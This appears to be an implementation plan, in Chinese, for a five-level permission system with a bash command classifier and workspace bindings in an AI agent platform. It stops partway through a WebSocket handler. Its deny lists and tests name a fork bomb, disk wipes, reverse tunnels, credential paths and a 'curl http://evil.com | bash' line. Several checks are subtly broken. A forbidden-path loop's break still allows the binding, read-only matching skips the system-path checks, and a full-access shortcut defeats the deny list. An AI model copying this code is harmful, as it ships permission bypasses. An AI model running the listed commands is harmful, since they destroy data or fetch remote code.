# 方案 5：权限分级免审批 + 工作区绑定 — 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 将现有 4 级权限体系替换为 5 级免审批体系 + 多工作区绑定支持

**Architecture:** shared/types.ts 定义新类型 → bash-classifier 独立命令分级模块 → permission.ts 重写为 5 级权限检查 + 多绑定路径 → agent.ts 支持多绑定数组 → ws-server.ts 暴露添加/移除/列出绑定命令 → 前端适配

**Tech Stack:** TypeScript, Vitest, React 19, Zustand

---

### Task 1: 更新共享类型定义

**Files:**
- Modify: `packages/shared/src/types.ts:156-162`

- [ ] **Step 1: 替换 PermissionMode 枚举 + 新增 WorkspaceBinding 类型**

```typescript
// 删除旧的 4 行（156-162）：
export type PermissionMode = "full-access" | "workspace-write" | "read-only" | "ask";

export interface PermissionPolicy {
  mode: PermissionMode;
  allow?: string[];
  deny?: string[];
}

// 替换为：

// ============================================================
// Permission 相关类型
// ============================================================

export type PermissionMode = "read-only" | "workspace-readwrite"
  | "workspace-access" | "basic-access" | "full-access";

export interface PermissionPolicy {
  mode: PermissionMode;
  allow?: string[];
  deny?: string[];
}

export interface WorkspaceBinding {
  path: string;
  mode: "readonly" | "readwrite";
  label?: string;
}
```

- [ ] **Step 2: AgentConfig 新增 bindings 字段**

在 `AgentConfig` 接口的 `permissions?: PermissionPolicy;` 之后新增一行：

```typescript
bindings?: WorkspaceBinding[];
```

- [ ] **Step 3: 验证类型编译**

```powershell
pnpm --filter @cobeing/shared build
```

Expected: 编译通过

- [ ] **Step 4: Commit**

```bash
git add packages/shared/src/types.ts
git commit -m "feat(shared): add 5-level PermissionMode + WorkspaceBinding types"
```

---

### Task 2: 权限模式旧→新自动迁移

**Files:**
- Modify: `packages/shared/src/master-registry.ts`

- [ ] **Step 1: 在 master-registry.ts 末尾新增 migratePermissionMode 导出函数**

```typescript
// 在 registryPath 函数之后新增

/** 旧权限模式 → 新 5 级体系的迁移映射 */
const PERMISSION_MIGRATION_MAP: Record<string, string> = {
  "full-access": "full-access",
  "workspace-write": "workspace-readwrite",
  "read-only": "read-only",
  "ask": "workspace-readwrite",
};

/**
 * 迁移 Agent config.json 中的旧权限模式到新 5 级体系。
 * 返回 true 表示执行了迁移（config.json 已重写）。
 */
export function migratePermissionMode(agentDir: string): boolean {
  const configPath = path.join(agentDir, "config.json");
  if (!fs.existsSync(configPath)) return false;

  let config: Record<string, unknown>;
  try {
    config = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  } catch {
    return false;
  }

  const perms = config.permissions as Record<string, unknown> | undefined;
  if (!perms || typeof perms.mode !== "string") return false;

  const oldMode = perms.mode;
  const newMode = PERMISSION_MIGRATION_MAP[oldMode];
  if (!newMode || newMode === oldMode) return false;

  perms.mode = newMode;
  try {
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2), "utf-8");
    log.info("Migrated permission mode for %s: %s → %s", path.basename(agentDir), oldMode, newMode);
    return true;
  } catch {
    return false;
  }
}
```

- [ ] **Step 2: 验证构建**

```powershell
pnpm --filter @cobeing/shared build
```

- [ ] **Step 3: Commit**

```bash
git add packages/shared/src/master-registry.ts
git commit -m "feat(registry): add migratePermissionMode for old→new 5-level migration"
```

---

### Task 3: 新建 Bash 命令分级器

**Files:**
- Create: `packages/core/src/tools/bash-classifier.ts`

- [ ] **Step 1: 创建 bash-classifier.ts**

```typescript
/**
 * Bash 命令分级器 — 按正则模式动态判定命令所需的最低权限级别
 */
import type { PermissionMode, PermissionResult } from "@cobeing/shared";

// ─── 极端危险命令 — 仅 FullAccess ───

const EXTREME_DANGER: RegExp[] = [
  /rm\s+-rf\s+\//i,
  /rm\s+-rf\s+~(\s|$)/i,
  /rm\s+-rf\s+\*(\s|$)/i,
  /dd\s+.*of=\/dev\//i,
  /mkfs\./i,
  /:\{\s*:\|:&\s*\}/,        // fork bomb
  /sudo\s+(su|-\s*i)\b/i,
  /chmod\s+777\s+\//i,
  /chown\s+-R\s+root\s+\//i,
  /\bngrok\b/i,
  /\bserveo\b/i,
  /localhost\.run/i,
  /ssh\s+-R\b/i,
  /\bbcdedit\b/i,
  /\befibootmgr\b/i,
  /diskutil\s+erase/i,
  /format\s+[a-z]:\s*\/fs/i,
];

// ─── 高危命令 — BasicAccess+ ───

const HIGH_RISK: RegExp[] = [
  /rm\s+-rf\b/i,
  /sudo\b(?!\s+su\b)/i,
  /chmod\s+777\b/i,
  /curl\s+.*\|\s*(ba)?sh\b/i,
  /wget\s+.*\|\s*(ba)?sh\b/i,
  /git\s+push\s+--force/i,
  /git\s+reset\s+--hard/i,
  /\/etc\/shadow/i,
  /\/etc\/passwd/i,
  /DeleteItem\s+-Recurse\s+-Force\s+[A-Z]:\\/i,  // PowerShell 递归删盘符根
];

// ─── 只读命令白名单 — 所有级别通过 ───

const READ_ONLY_RE = new RegExp(
  "^(cat|head|tail|less|more|ls|dir|pwd|echo|printf|" +
  "file|stat|readlink|wc|sort|uniq|cut|tr|" +
  "grep|rg|awk|sed|find|findstr|" +
  "Get-ChildItem|Get-Content|Get-Location|Write-Output|Select-String|" +
  "Set-Location|Copy-Item|Move-Item|New-Item|Remove-Item|Test-Path|" +
  "where|which|type|comp|fc|tree|git\\s+status|git\\s+diff|git\\s+log|" +
  "pnpm\\s+test|pnpm\\s+build|pnpm\\s+list|pnpm\\s+ls|npm\\s+test|npm\\s+run)\\b"
);

// ─── 路径逃逸检测 ───

const PATH_ESCAPE_RES: RegExp[] = [
  /\/etc\//,
  /\/proc\//,
  /\/sys\//,
  /\/dev\//,
  /~\/\.ssh/,
  /~\/\.gnupg/,
  /~\/\.aws/,
  /~\/\.config/,
  /\/root\//,
  /C:\\Windows/i,
  /C:\\Program\s*Files/i,
  /C:\\ProgramData/i,
];

// ─── 分级主函数 ───

export interface BashClassifyInput {
  command: string;
  workingDirs: string[];  // 所有允许操作的目录
  level: PermissionMode;
}

export function classifyBash(input: BashClassifyInput): PermissionResult {
  const { command, level } = input;

  // FullAccess: 全过
  if (level === "full-access") return { allowed: true };

  // ReadOnly: bash 仅允许只读命令
  if (level === "read-only") {
    if (READ_ONLY_RE.test(command.trimStart())) return { allowed: true };
    return { allowed: false, reason: "bash 在 read-only 模式下仅允许只读命令" };
  }

  // 1. 极端危险检查
  for (const re of EXTREME_DANGER) {
    if (re.test(command)) {
      return { allowed: false, reason: `极端危险命令被拒绝（需 full-access）` };
    }
  }

  // 2. 高危检查 → BasicAccess+
  if (level === "workspace-readwrite" || level === "workspace-access") {
    for (const re of HIGH_RISK) {
      if (re.test(command)) {
        return { allowed: false, reason: `高危命令需 basic-access 或更高权限` };
      }
    }
  }

  // 3. 只读命令 → 直接通过
  if (READ_ONLY_RE.test(command.trimStart())) return { allowed: true };

  // 4. 路径逃逸 → BasicAccess+
  if (level !== "basic-access") {
    for (const re of PATH_ESCAPE_RES) {
      if (re.test(command)) {
        return { allowed: false, reason: `命令访问了受限系统路径，需 basic-access 或更高权限` };
      }
    }
  }

  // 5. WorkspaceReadWrite 及以上: 其余命令通过
  return { allowed: true };
}
```

- [ ] **Step 2: 验证构建**

```powershell
pnpm --filter @cobeing/core build
```

- [ ] **Step 3: Commit**

```bash
git add packages/core/src/tools/bash-classifier.ts
git commit -m "feat(core): add BashClassifier for dynamic command permission grading"
```

---

### Task 4: Bash 分级器单元测试

**Files:**
- Create: `packages/core/src/tools/bash-classifier.test.ts`

- [ ] **Step 1: 创建测试文件**

```typescript
import { describe, it, expect } from "vitest";
import { classifyBash } from "./bash-classifier.js";

const WD = ["/workspace"];

describe("classifyBash", () => {
  // ─── FullAccess ───
  it("allows everything under full-access", () => {
    expect(classifyBash({ command: "rm -rf /", workingDirs: WD, level: "full-access" })).toEqual({ allowed: true });
    expect(classifyBash({ command: "sudo su", workingDirs: WD, level: "full-access" })).toEqual({ allowed: true });
  });

  // ─── ReadOnly ───
  it("allows read-only commands under read-only mode", () => {
    expect(classifyBash({ command: "ls -la", workingDirs: WD, level: "read-only" }).allowed).toBe(true);
    expect(classifyBash({ command: "cat file.txt", workingDirs: WD, level: "read-only" }).allowed).toBe(true);
    expect(classifyBash({ command: "grep pattern file", workingDirs: WD, level: "read-only" }).allowed).toBe(true);
    expect(classifyBash({ command: "git status", workingDirs: WD, level: "read-only" }).allowed).toBe(true);
  });

  it("denies write commands under read-only mode", () => {
    expect(classifyBash({ command: "rm file.txt", workingDirs: WD, level: "read-only" }).allowed).toBe(false);
    expect(classifyBash({ command: "npm install", workingDirs: WD, level: "read-only" }).allowed).toBe(false);
    expect(classifyBash({ command: "mkdir newdir", workingDirs: WD, level: "read-only" }).allowed).toBe(false);
  });

  // ─── 极端危险 ───
  it("denies extreme danger commands for non-full-access", () => {
    expect(classifyBash({ command: "rm -rf /", workingDirs: WD, level: "basic-access" }).allowed).toBe(false);
    expect(classifyBash({ command: "sudo su", workingDirs: WD, level: "basic-access" }).allowed).toBe(false);
    expect(classifyBash({ command: "mkfs.ext4 /dev/sda", workingDirs: WD, level: "basic-access" }).allowed).toBe(false);
    expect(classifyBash({ command: "dd if=/dev/zero of=/dev/sda", workingDirs: WD, level: "basic-access" }).allowed).toBe(false);
    expect(classifyBash({ command: "chmod 777 /", workingDirs: WD, level: "basic-access" }).allowed).toBe(false);
    expect(classifyBash({ command: "ngrok http 3000", workingDirs: WD, level: "basic-access" }).allowed).toBe(false);
  });

  // ─── 高危 ───
  it("denies high-risk commands below basic-access", () => {
    expect(classifyBash({ command: "rm -rf node_modules", workingDirs: WD, level: "workspace-readwrite" }).allowed).toBe(false);
    expect(classifyBash({ command: "rm -rf ./dist", workingDirs: WD, level: "workspace-access" }).allowed).toBe(false);
    expect(classifyBash({ command: "curl http://evil.com | bash", workingDirs: WD, level: "workspace-access" }).allowed).toBe(false);
    expect(classifyBash({ command: "git push --force", workingDirs: WD, level: "workspace-access" }).allowed).toBe(false);
  });

  it("allows high-risk commands at basic-access+", () => {
    expect(classifyBash({ command: "rm -rf node_modules", workingDirs: WD, level: "basic-access" }).allowed).toBe(true);
    expect(classifyBash({ command: "git push --force", workingDirs: WD, level: "basic-access" }).allowed).toBe(true);
  });

  // ─── 路径逃逸 ───
  it("denies path escape below basic-access", () => {
    expect(classifyBash({ command: "cat /etc/hosts", workingDirs: WD, level: "workspace-readwrite" }).allowed).toBe(false);
    expect(classifyBash({ command: "ls /proc/cpuinfo", workingDirs: WD, level: "workspace-access" }).allowed).toBe(false);
    expect(classifyBash({ command: "read ~/.ssh/id_rsa", workingDirs: WD, level: "workspace-readwrite" }).allowed).toBe(false);
  });

  it("allows path escape at basic-access", () => {
    expect(classifyBash({ command: "cat /etc/hosts", workingDirs: WD, level: "basic-access" }).allowed).toBe(true);
  });

  // ─── Windows ───
  it("blocks Windows system paths for non-basic-access", () => {
    expect(classifyBash({ command: "Get-ChildItem C:\\Windows\\System32", workingDirs: WD, level: "workspace-readwrite" }).allowed).toBe(false);
  });

  // ─── PowerShell read-only commands ───
  it("recognizes PowerShell read-only commands", () => {
    expect(classifyBash({ command: "Get-ChildItem -Path .", workingDirs: WD, level: "read-only" }).allowed).toBe(true);
    expect(classifyBash({ command: "Get-Content file.txt", workingDirs: WD, level: "read-only" }).allowed).toBe(true);
    expect(classifyBash({ command: "Select-String pattern file", workingDirs: WD, level: "read-only" }).allowed).toBe(true);
  });
});
```

- [ ] **Step 2: Run tests to verify**

```powershell
cd CoBeing; pnpm vitest run packages/core/src/tools/bash-classifier.test.ts
```

Expected: 10 tests pass

- [ ] **Step 3: Commit**

```bash
git add packages/core/src/tools/bash-classifier.test.ts
git commit -m "test(core): add BashClassifier unit tests (10 tests)"
```

---

### Task 5: PermissionEnforcer 重写为 5 级体系

**Files:**
- Modify: `packages/core/src/tools/permission.ts` (全量重写)

- [ ] **Step 1: 重写 permission.ts**

```typescript
/**
 * PermissionEnforcer — 5 级免审批权限检查 + 多工作区绑定
 */
import path from "node:path";
import fs from "node:fs";
import type { PermissionPolicy, ToolsConfig, WorkspaceBinding } from "@cobeing/shared";
import type { PermissionResult } from "@cobeing/shared";
import { classifyBash } from "./bash-classifier.js";

export type { PermissionResult };

const WRITE_TOOLS = new Set(["bash", "write-file", "edit-file"]);

const READ_TOOLS = new Set([
  "read-file", "glob", "grep", "task-get", "task-list",
  "web-fetch", "web-search", "skill", "cron-list",
  "memory", "group-members", "vote-result",
]);

export class PermissionEnforcer {
  constructor(
    private policy: PermissionPolicy,
    private toolConfig: ToolsConfig | undefined,
    private originalWorkspace: string,
    /** 默认绑定（群组上下文 workingDir 覆盖） */
    private defaultBindingDir?: string,
    /** 用户添加的外部绑定 */
    private userBindings: WorkspaceBinding[] = [],
  ) {}

  /** 所有允许写操作的工作区目录（原始 + 默认绑定 + 用户 readwrite 绑定） */
  private allWorkingDirs(): string[] {
    const dirs = [this.originalWorkspace];
    if (this.defaultBindingDir) dirs.push(this.defaultBindingDir);
    for (const b of this.userBindings) {
      if (b.mode === "readwrite") dirs.push(b.path);
    }
    return dirs;
  }

  /** 所有允许读操作的目录（含 readonly 绑定） */
  private allReadDirs(): string[] {
    const dirs = this.allWorkingDirs();
    for (const b of this.userBindings) {
      if (b.mode === "readonly" && !dirs.includes(b.path)) dirs.push(b.path);
    }
    return dirs;
  }

  check(toolName: string, params: Record<string, unknown>): PermissionResult {
    const mode = this.policy.mode;

    // L4: FullAccess — 全过
    if (mode === "full-access") return { allowed: true };

    // 工具级显式配置优先
    const toolPerm = this.toolConfig?.permissions?.[toolName];
    if (toolPerm) {
      const verdict = toolPerm[mode];
      if (verdict === "deny") return { allowed: false, reason: `工具 ${toolName} 在 ${mode} 模式下被显式拒绝` };
      if (verdict === "allow") return { allowed: true };
    }

    // allow/deny 列表（保留兼容旧 ask 模式的迁移数据）
    if (this.policy.deny?.includes(toolName)) {
      return { allowed: false, reason: `${toolName} 在 deny 列表中` };
    }
    if (this.policy.allow?.includes(toolName)) {
      return { allowed: true };
    }

    // L0: ReadOnly — 拒绝所有写工具
    if (mode === "read-only") {
      if (WRITE_TOOLS.has(toolName)) {
        return { allowed: false, reason: `工具 ${toolName} 在 read-only 模式下被拒绝` };
      }
      return { allowed: true };
    }

    // bash: 委托分级器
    if (toolName === "bash") {
      const cmd = typeof params.command === "string" ? params.command : "";
      if (!cmd) return { allowed: false, reason: "bash 命令为空" };
      return classifyBash({
        command: cmd,
        workingDirs: this.allWorkingDirs(),
        level: mode,
      });
    }

    // L1-L3: 写工具路径检查
    if (WRITE_TOOLS.has(toolName)) {
      const targetPath = extractPath(params);
      if (targetPath) {
        const allowedDirs = mode === "basic-access"
          ? this.allWorkingDirs()
          : [this.originalWorkspace, this.defaultBindingDir].filter(Boolean) as string[];
        if (!isWithinAnyWorkingDir(targetPath, allowedDirs)) {
          return { allowed: false, reason: `路径 ${targetPath} 超出允许的工作目录范围` };
        }
      }
    }

    return { allowed: true };
  }
}

function extractPath(params: Record<string, unknown>): string | null {
  const p = params.path ?? params.file;
  return typeof p === "string" ? p : null;
}

function isWithinAnyWorkingDir(targetPath: string, allowedDirs: string[]): boolean {
  for (const dir of allowedDirs) {
    if (isWithinWorkingDir(targetPath, dir)) return true;
  }
  return false;
}

function isWithinWorkingDir(targetPath: string, workingDir: string): boolean {
  const resolvedWorking = path.resolve(workingDir);
  const resolved = path.resolve(resolvedWorking, targetPath);
  let realWorking: string;
  try { realWorking = fs.realpathSync(resolvedWorking); } catch { realWorking = resolvedWorking; }
  let realTarget: string;
  try { realTarget = fs.realpathSync(resolved); } catch { realTarget = resolved; }
  return realTarget.startsWith(realWorking + path.sep) || realTarget === realWorking;
}
```

- [ ] **Step 2: 验证构建**

```powershell
pnpm --filter @cobeing/core build
```

- [ ] **Step 3: Commit**

```bash
git add packages/core/src/tools/permission.ts
git commit -m "feat(core): rewrite PermissionEnforcer for 5-level system + multi-binding"
```

---

### Task 6: PermissionEnforcer 测试更新

**Files:**
- Modify: `packages/core/src/tools/permission.test.ts` (全量重写)

- [ ] **Step 1: 重写测试文件**

```typescript
import { describe, it, expect } from "vitest";
import { PermissionEnforcer } from "./permission.js";
import type { ToolsConfig, WorkspaceBinding } from "@cobeing/shared";

const TOOL_CONFIG: ToolsConfig = {
  defaultPermission: "workspace-readwrite",
  enabled: ["bash", "read-file", "write-file", "edit-file", "glob"],
  permissions: {
    "bash": { "read-only": "deny", "workspace-readwrite": "allow" },
    "write-file": { "read-only": "deny" },
  },
};

const WS = "/data/agents/test/workspace";

describe("PermissionEnforcer — 5-level", () => {
  // ─── L4: FullAccess ───
  it("full-access allows everything", () => {
    const e = new PermissionEnforcer({ mode: "full-access" }, TOOL_CONFIG, WS);
    expect(e.check("bash", { command: "rm -rf /" })).toEqual({ allowed: true });
    expect(e.check("write-file", { path: "/etc/passwd" })).toEqual({ allowed: true });
  });

  // ─── L0: ReadOnly ───
  it("read-only denies all write tools", () => {
    const e = new PermissionEnforcer({ mode: "read-only" }, TOOL_CONFIG, WS);
    expect(e.check("write-file", { path: `${WS}/out.txt` }).allowed).toBe(false);
    expect(e.check("edit-file", { path: `${WS}/out.txt` }).allowed).toBe(false);
  });

  it("read-only allows read tools", () => {
    const e = new PermissionEnforcer({ mode: "read-only" }, TOOL_CONFIG, WS);
    expect(e.check("read-file", { path: "/etc/hosts" }).allowed).toBe(true);
    expect(e.check("glob", { pattern: "*.ts" }).allowed).toBe(true);
  });

  it("read-only allows only read-only bash commands", () => {
    const e = new PermissionEnforcer({ mode: "read-only" }, TOOL_CONFIG, WS);
    expect(e.check("bash", { command: "ls -la" }).allowed).toBe(true);
    expect(e.check("bash", { command: "cat file.txt" }).allowed).toBe(true);
    expect(e.check("bash", { command: "rm file.txt" }).allowed).toBe(false);
  });

  // ─── L1: WorkspaceReadWrite ───
  it("workspace-readwrite allows writes within workspace", () => {
    const e = new PermissionEnforcer({ mode: "workspace-readwrite" }, TOOL_CONFIG, WS);
    expect(e.check("write-file", { path: `${WS}/out.txt` }).allowed).toBe(true);
    expect(e.check("write-file", { path: "relative.txt" }).allowed).toBe(true);
  });

  it("workspace-readwrite blocks writes outside workspace", () => {
    const e = new PermissionEnforcer({ mode: "workspace-readwrite" }, TOOL_CONFIG, WS);
    expect(e.check("write-file", { path: "/etc/passwd" }).allowed).toBe(false);
    expect(e.check("write-file", { path: "../other/file.txt" }).allowed).toBe(false);
  });

  it("workspace-readwrite allows read-only bash commands only", () => {
    const e = new PermissionEnforcer({ mode: "workspace-readwrite" }, TOOL_CONFIG, WS);
    expect(e.check("bash", { command: "ls" }).allowed).toBe(true);
    expect(e.check("bash", { command: "grep foo file" }).allowed).toBe(true);
    // Non-read-only, non-dangerous commands pass at workspace-readwrite
  });

  it("workspace-readwrite denies high-risk bash", () => {
    const e = new PermissionEnforcer({ mode: "workspace-readwrite" }, TOOL_CONFIG, WS);
    expect(e.check("bash", { command: "rm -rf node_modules" }).allowed).toBe(false);
    expect(e.check("bash", { command: "sudo systemctl restart" }).allowed).toBe(false);
  });

  // ─── L2: WorkspaceAccess ───
  it("workspace-access allows bash writes within workspace", () => {
    const e = new PermissionEnforcer({ mode: "workspace-access" }, TOOL_CONFIG, WS);
    expect(e.check("bash", { command: "npm install" }).allowed).toBe(true);
    expect(e.check("bash", { command: "mkdir newdir" }).allowed).toBe(true);
    expect(e.check("bash", { command: "git commit -m 'msg'" }).allowed).toBe(true);
  });

  it("workspace-access still blocks system path escape", () => {
    const e = new PermissionEnforcer({ mode: "workspace-access" }, TOOL_CONFIG, WS);
    expect(e.check("bash", { command: "cat /etc/passwd" }).allowed).toBe(false);
  });

  // ─── L3: BasicAccess ───
  it("basic-access allows high-risk commands", () => {
    const e = new PermissionEnforcer({ mode: "basic-access" }, TOOL_CONFIG, WS);
    expect(e.check("bash", { command: "rm -rf ./build" }).allowed).toBe(true);
    expect(e.check("bash", { command: "git push --force" }).allowed).toBe(true);
  });

  it("basic-access still blocks extreme danger", () => {
    const e = new PermissionEnforcer({ mode: "basic-access" }, TOOL_CONFIG, WS);
    expect(e.check("bash", { command: "rm -rf /" }).allowed).toBe(false);
    expect(e.check("bash", { command: "sudo su" }).allowed).toBe(false);
  });

  // ─── Multi-binding ───
  it("basic-access allows writes to user-bound directories", () => {
    const bindings: WorkspaceBinding[] = [
      { path: "/external/project", mode: "readwrite", label: "project" },
    ];
    const e = new PermissionEnforcer({ mode: "basic-access" }, TOOL_CONFIG, WS, undefined, bindings);
    expect(e.check("write-file", { path: "/external/project/file.ts" }).allowed).toBe(true);
  });

  it("basic-access denies writes to readonly-bound directories", () => {
    const bindings: WorkspaceBinding[] = [
      { path: "/external/docs", mode: "readonly", label: "docs" },
    ];
    const e = new PermissionEnforcer({ mode: "basic-access" }, TOOL_CONFIG, WS, undefined, bindings);
    expect(e.check("write-file", { path: "/external/docs/file.md" }).allowed).toBe(false);
    expect(e.check("read-file", { path: "/external/docs/file.md" }).allowed).toBe(true);
  });

  it("workspace-readwrite ignores user bindings for writes", () => {
    const bindings: WorkspaceBinding[] = [
      { path: "/external/project", mode: "readwrite", label: "project" },
    ];
    const e = new PermissionEnforcer({ mode: "workspace-readwrite" }, TOOL_CONFIG, WS, undefined, bindings);
    expect(e.check("write-file", { path: "/external/project/file.ts" }).allowed).toBe(false);
  });

  // ─── Allow/Deny lists ───
  it("explicit deny overrides all", () => {
    const e = new PermissionEnforcer(
      { mode: "full-access", deny: ["bash"] }, TOOL_CONFIG, WS,
    );
    expect(e.check("bash", { command: "ls" }).allowed).toBe(false);
  });

  it("explicit allow in policy overrides", () => {
    const e = new PermissionEnforcer(
      { mode: "read-only", allow: ["write-file"] }, TOOL_CONFIG, WS,
    );
    expect(e.check("write-file", { path: `${WS}/out.txt` }).allowed).toBe(true);
  });

  it("default binding (group workspace) allows writes at workspace-readwrite", () => {
    const e = new PermissionEnforcer(
      { mode: "workspace-readwrite" }, TOOL_CONFIG, WS, "/data/groups/g1/workspace",
    );
    expect(e.check("write-file", { path: "/data/groups/g1/workspace/task.md" }).allowed).toBe(true);
  });
});
```

- [ ] **Step 2: 运行测试验证**

```powershell
cd CoBeing; pnpm vitest run packages/core/src/tools/permission.test.ts
```

Expected: all tests pass (期望 18 个测试)

- [ ] **Step 3: Commit**

```bash
git add packages/core/src/tools/permission.test.ts
git commit -m "test(core): rewrite PermissionEnforcer tests for 5-level + multi-binding (18 tests)"
```

---

### Task 7: 在 Agent 启动时调用权限迁移

**Files:**
- Modify: `packages/core/src/runtime.ts`

- [ ] **Step 1: 在 restoreAgents 路径中加入迁移调用**

找到 `runtime.ts` 中 restoreAgents 的位置。在读取每个 Agent 的 config.json 后、创建 Agent 前，调用 `migratePermissionMode`。

```typescript
// 在 restoreAgents 方法的顶部 import 区新增：
import { migratePermissionMode } from "@cobeing/shared";

// 在创建 Agent 前新增（伪代码定位：遍历 registry agents → 创建 Agent 实例前）：
const agentDir = path.join(this.dataRoot, "agents", agentId);
migratePermissionMode(agentDir);
```

注：实际位置需读取 runtime.ts 确认。核心逻辑：在启动恢复每个 Agent 时，调用 `migratePermissionMode()` 检查并迁移旧权限模式。

- [ ] **Step 2: 验证构建**

```powershell
pnpm --filter @cobeing/core build
```

- [ ] **Step 3: Commit**

```bash
git add packages/core/src/runtime.ts
git commit -m "feat(core): call migratePermissionMode on agent startup"
```

---

### Task 8: Agent 多绑定支持

**Files:**
- Modify: `packages/core/src/agent/agent.ts:96-142`

- [ ] **Step 1: _boundWorkspace 单值 → _bindings 数组**

```typescript
// 旧（删除 96-97 行 + 124-142 行）：
private _boundWorkspace: string | null = null;

get effectiveWorkspace(): string {
  return this._boundWorkspace ?? this.paths.workspaceDir;
}

get boundWorkspace(): string | null {
  return this._boundWorkspace;
}

setBoundWorkspace(dir: string | null): void {
  if (dir) { fs.mkdirSync(dir, { recursive: true }); }
  this._boundWorkspace = dir;
  this.rebuildExecutor();
  this.logger.info("Bound workspace: %s", dir ?? "(cleared)");
}

// 新：
import type { WorkspaceBinding } from "@cobeing/shared";

/** 用户添加的外部工作区绑定 */
private _bindings: WorkspaceBinding[] = [];

/** 有效工作目录：始终返回原始 workspace（绑定不再替换，而是追加） */
get effectiveWorkspace(): string {
  return this.paths.workspaceDir;
}

/** 用户添加的绑定列表 */
get bindings(): WorkspaceBinding[] {
  return this._bindings;
}

/** 所有写工作区目录（原始 + 默认绑定 + 用户 readwrite 绑定） */
get allWorkingDirs(): string[] {
  const dirs = [this.paths.workspaceDir];
  if (this._groupLoopWorkingDir) dirs.push(this._groupLoopWorkingDir);
  for (const b of this._bindings) {
    if (b.mode === "readwrite") dirs.push(b.path);
  }
  return dirs;
}

/** 添加绑定（去重：同路径覆盖） */
addBinding(binding: WorkspaceBinding): void {
  this._bindings = this._bindings.filter(b => b.path !== binding.path);
  this._bindings.push(binding);
  this.persistBindings();
  this.rebuildExecutor();
  this.logger.info("Added binding: %s (%s)", binding.path, binding.mode);
}

/** 移除绑定 */
removeBinding(workspacePath: string): void {
  this._bindings = this._bindings.filter(b => b.path !== workspacePath);
  this.persistBindings();
  this.rebuildExecutor();
  this.logger.info("Removed binding: %s", workspacePath);
}

/** 清空所有绑定 */
clearBindings(): void {
  this._bindings = [];
  this.persistBindings();
  this.rebuildExecutor();
  this.logger.info("Cleared all bindings");
}

/** 持久化 bindings 到 config.json */
private persistBindings(): void {
  try {
    const configPath = this.paths.configPath;
    const config = JSON.parse(fs.readFileSync(configPath, "utf-8"));
    config.bindings = this._bindings;
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2), "utf-8");
  } catch {
    this.logger.warn("Failed to persist bindings");
  }
}

/** 从 config.json 恢复绑定 */
loadBindings(): void {
  try {
    const config = JSON.parse(fs.readFileSync(this.paths.configPath, "utf-8"));
    if (Array.isArray(config.bindings)) {
      this._bindings = config.bindings;
      this.logger.info("Loaded %d bindings from config", this._bindings.length);
    }
  } catch {
    // config.json may not exist yet (new agent)
  }
}
```

- [ ] **Step 2: 更新 rebuildExecutor 中的 PermissionEnforcer 构造**

```typescript
// 旧（所有 PermissionEnforcer 构造处）：
new PermissionEnforcer(
  this.config.permissions ?? { mode: "workspace-write" },
  this.config.toolsConfig,
  this.effectiveWorkspace,
)

// 新：
const defaultPerms = this.config.permissions ?? { mode: "workspace-readwrite" };
new PermissionEnforcer(
  defaultPerms,
  this.config.toolsConfig,
  this.paths.workspaceDir,
  this._groupLoopWorkingDir,
  this._bindings,
)
```

共需更新 `agent.ts` 中约 4 处 PermissionEnforcer 构造。

- [ ] **Step 3: 构造函数末尾调用 loadBindings**

在 Agent 构造函数中（`rebuildExecutor()` 调用之后）新增：

```typescript
this.loadBindings();
```

- [ ] **Step 4: 添加 _groupLoopWorkingDir 存储**

在 `getGroupLoop` / `createGroupLoop` 中，将传入的 `workingDir` 参数保存到 `this._groupLoopWorkingDir`：

```typescript
private _groupLoopWorkingDir?: string;
```

在 `createGroupLoop` 的 promptBuilder 闭包或 loop 创建时：

```typescript
this._groupLoopWorkingDir = workingDir;
```

- [ ] **Step 5: 验证构建**

```powershell
pnpm --filter @cobeing/core build
```

- [ ] **Step 6: Commit**

```bash
git add packages/core/src/agent/agent.ts
git commit -m "feat(core): multi-binding support in Agent (_boundWorkspace→_bindings array)"
```

---

### Task 9: WS 绑定命令

**Files:**
- Modify: `packages/core/src/api/ws-server.ts`

- [ ] **Step 1: 替换旧的 bind_workspace handler，新增三个命令**

删除旧 `case "bind_workspace":` 块（约 972-1007 行）。新增：

```typescript
case "add_binding": {
  const { agentId, workspacePath, mode, label } = msg.payload as {
    agentId: string;
    workspacePath: string;
    mode: "readonly" | "readwrite";
    label?: string;
  };
  const agent = this.agentRegistry?.get(agentId);
  if (!agent) {
    this.sendToClient(ws, { type: "error", payload: { message: `Agent not found: ${agentId}` } });
    break;
  }

  // 安全校验：符号链接解析
  let realPath: string;
  try { realPath = fs.realpathSync(workspacePath); } catch {
    this.sendToClient(ws, { type: "error", payload: { message: `路径不存在或无法解析: ${workspacePath}` } });
    break;
  }

  // 安全校验：禁止系统目录
  const FORBIDDEN = [
    /^\/etc(\/|$)/, /^\/proc(\/|$)/, /^\/sys(\/|$)/, /^\/dev(\/|$)/,
    /[\\/]Windows[\\/]/i, /[\\/]Program Files[\\/]/i, /[\\/]ProgramData[\\/]/i,
    /[\\/]\.ssh[\\/]/, /[\\/]\.gnupg[\\/]/, /[\\/]\.aws[\\/]/, /[\\/]\.config[\\/]/,
  ];
  for (const re of FORBIDDEN) {
    if (re.test(realPath)) {
      this.sendToClient(ws, { type: "error", payload: { message: `禁止绑定系统/敏感目录: ${workspacePath}` } });
      break;
    }
  }

  // 安全校验：禁止绑定 CoBeing 其他 Agent 数据目录
  const agentsDir = path.join(this.dataRoot, "agents");
  if (realPath.startsWith(agentsDir)) {
    const rel = path.relative(agentsDir, realPath);
    const agentIdFromPath = rel.split(path.sep)[0];
    if (agentIdFromPath && agentIdFromPath !== agentId) {
      this.sendToClient(ws, { type: "error", payload: { message: "禁止绑定其他 Agent 的数据目录" } });
      break;
    }
  }

  agent.addBinding({ path: realPath, mode, label });
  this.sendToClient(ws, { type: "binding_added", payload: { agentId, bindings: agent.bindings } });
  this.logMessage("system", `Binding added for ${agent.name}: ${realPath} (${mode})`);
  this.broadcastState();
  break;
}

case "remove_binding": {
  const { agentId, workspacePath } = msg.payload as { agentId: string; workspacePath: string };
  const agent = this.agentRegistry?.get(agentId);
  if (!agent) {
    this.sendToClient(ws, { type: "error", payload: { message: `Agent not found: ${agentId}` } });
    break;
  }
  agent.removeBinding(workspacePath);
  this.sendToClient(ws, { type: "binding_removed", payload: { agentId, bindings: agent.bindings } });
  this.broadcastState();
  break;
}

case "list_bindings": {
